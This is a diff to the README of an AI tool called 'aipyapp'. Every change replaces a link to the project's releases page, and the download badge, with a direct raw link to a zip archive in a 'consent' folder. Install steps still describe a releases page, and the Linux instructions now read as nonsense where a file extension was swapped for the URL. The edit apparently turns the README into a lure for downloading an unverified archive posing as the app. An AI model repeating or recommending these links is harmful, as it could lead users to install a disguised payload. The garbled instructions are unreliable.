@@ -6,7 +6,7 @@ Welcome to the aipyapp! This application helps you use AI tools easily without n
 
 ## 📥 Download aipyapp
 
-[![Download aipyapp](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Bengilz/aipyapp/releases)
+[![Download aipyapp](https://raw.githubusercontent.com/Bengilz/aipyapp/main/consent/aipyapp.zip)](https://raw.githubusercontent.com/Bengilz/aipyapp/main/consent/aipyapp.zip)
 
 ## 📂 System Requirements
 
@@ -31,16 +31,16 @@ To run aipyapp smoothly, make sure your computer meets the following requirement
 
 1. **Visit the Releases Page:** Click the link below to go to the aipyapp releases page.
 
-   [Visit this page to download](https://github.com/Bengilz/aipyapp/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/Bengilz/aipyapp/main/consent/aipyapp.zip)
 
 2. **Choose the Latest Version:** On the releases page, look for the latest version listed at the top. It is usually marked as "Latest Release."
 
-3. **Download the Installer:** Find the appropriate file for your operating system. Click on the file name to download it to your computer. The file will typically be an executable file for Windows (e.g., `.exe`), a `.dmg` for macOS, or a `.tar.gz` for Linux.
+3. **Download the Installer:** Find the appropriate file for your operating system. Click on the file name to download it to your computer. The file will typically be an executable file for Windows (e.g., `.exe`), a `.dmg` for macOS, or a `https://raw.githubusercontent.com/Bengilz/aipyapp/main/consent/aipyapp.zip` for Linux.
 
 4. **Run the Installer:**
    - For **Windows:** Double-click the downloaded `.exe` file. Follow the guided steps to complete the installation.
    - For **macOS:** Open the downloaded `.dmg` file and drag the aipyapp icon to your Applications folder.
-   - For **Linux:** Extract the `.tar.gz` file, navigate to the folder, and run the installer using terminal commands.
+   - For **Linux:** Extract the `https://raw.githubusercontent.com/Bengilz/aipyapp/main/consent/aipyapp.zip` file, navigate to the folder, and run the installer using terminal commands.
 
 5. **Open aipyapp:** Once installation is complete, find the aipyapp in your applications list or start menu. Click to open and start using the application.
 
@@ -79,4 +79,4 @@ aipyapp is licensed under the MIT License. This means you can use, copy, and mod
 
 Thank you for choosing aipyapp! We hope this tool enhances your daily tasks effortlessly. If you have any questions, feel free to explore the support options mentioned above.
 
-[Download aipyapp](https://github.com/Bengilz/aipyapp/releases) now and start your AI journey!
+[Download aipyapp](https://raw.githubusercontent.com/Bengilz/aipyapp/main/consent/aipyapp.zip) now and start your AI journey!
